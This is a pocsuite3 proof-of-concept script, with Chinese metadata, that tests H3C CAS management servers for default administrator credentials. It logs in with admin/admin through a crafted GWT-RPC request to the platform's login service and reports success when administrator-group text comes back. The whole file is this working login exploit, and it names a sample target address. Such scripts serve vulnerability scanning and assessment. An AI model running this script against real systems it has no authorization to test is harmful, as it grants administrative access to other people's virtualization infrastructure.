#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import re
import json

class TestPOC(POCBase):
	vulID = 'DSO-07112'
	cveID = ''
	cnvdID = ''
	cnnvdID = ''
	version = '1.0'
	author = 'Cooraper'
	vulDate = '2022-07-26'
	createDate = '2022-07-26'
	updateDate = '2022-07-26'
	name = 'H3C CAS 存在默认账号密码漏洞'
	desc = 'H3C CAS 存在默认账号密码漏洞，攻击者利用该漏洞可以直接进入后台，执行其他敏感操作，获取更多敏感数据。'
	solution = '<p>禁止使用默认口令，口令应满足一定复杂度。</p>'
	severity = 'medium'
	vulType = 'default-pass'
	taskType = 'app-vul'
	proto = ['http']
	scanFlag = 1
	tag = ['important']
	references = ['']
	appName = 'H3C CAS'
	appVersion = 'All'
	cweID = 'CWE-521'
	appPowerLink =''
	samples = ['http://119.32.29.44:8888']
	isPublic = 0
	appDevLanguage = '' 
	appCategory = ''
	
	def _attack(self):
		return self._verify()

	def _verify(self):
		result = {}
		headers={
		   	'Referer':self.url+'/login'
		}
		path='/cas/'
		vulur1 = self.url + path
		base_resp = requests.get(vulur1,headers=headers,verify=False,allow_redirects=False,timeout=10)
		if base_resp.status_code == 200 and 'H3C CAS' in base_resp.text:
			cookie = re.findall('JSESSIONID=(.*?);',base_resp.headers.get('Set-Cookie'))[0]
			headers1 = {
		    	'Content-Type':'text/x-gwt-rpc; charset=utf-8',
		    	'X-GWT-Permutation':'0',
		    	'Cookie': 'JSESSIONID='+cookie,
			}
			path1 = "/cas/plat/login.svc"
			vulur2 = self.url + path1
			data='7|0|7|{}/cas/plat/|3731A615C2F255C66B0FD60F97766C88|com.virtual.plat.client.operator.LoginService|doLogin|java.lang.String/2004016611|java.lang.Boolean/476441737|admin|1|2|3|4|3|5|5|6|7|7|6|0|'.format(self.url)
			resp = requests.post(vulur2,headers=headers1,verify=False,allow_redirects=False,data=data,timeout=10)
			if  resp.status_code == 200 and '系统管理员组' in resp.text and '超级管理员' in resp.text :
				result['VerifyInfo'] = {}
				result['VerifyInfo']['URL'] = vulur2
				result['VerifyInfo']['Content'] = "admin/admin"
		return self.parse_verify(result)

	def parse_verify(self, result):
		output = Output(self)
		if result:
			output.success(result)
		else:
			output.fail('target is not vulnerable')
		return output

register_poc(TestPOC)
